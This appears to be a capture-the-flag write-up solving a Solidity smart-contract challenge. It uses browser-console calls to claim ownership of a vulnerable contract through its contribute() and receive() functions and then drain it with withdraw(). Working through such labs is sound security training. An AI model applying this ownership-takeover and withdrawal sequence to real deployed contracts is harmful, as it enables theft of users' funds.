tx id: `0x0a7c7bc3dee8c8be2baa8fc30c82d9e57df81e16aea1bea3c96b9ba9542b53ac`

examining storage:

`await contract.owner()`: "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB"

`await contract.contributions("0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB")`: words: Array(4) [ 44040192, 40595831, 222044, … ] // contributions == 84858067

# claim ownership of the contract:

two ownership transfers (`owner = msg.sender;`) to examine:

1. ```
   function contribute() public payable {
     require(msg.value < 0.001 ether);
     contributions[msg.sender] += msg.value;
     if(contributions[msg.sender] > contributions[owner]) {
       owner = msg.sender;
     }
   }
   ```

   `contract.contribute({value: 84858068})` => `await contract.getContribution()` => words: (3) [17749204, 1, empty]

   weird.. but at least it fulfilled `contributions[msg.sender] > 0` which will be useful in a sec

2. ```
   receive() external payable {
       require(msg.value > 0 && contributions[msg.sender] > 0);
       owner = msg.sender;
     }
   ```

   from [solidity docs](https://docs.soliditylang.org/en/latest/contracts.html#special-functions):

   "the receive function is executed on a call to the contract with empty calldata"

   so one sends 84858067+1 wei to the instance contract with empty calldata to claim ownership of the contract

# reduce balance to 0

now that ownership is claimed, just `contract.withdraw()`
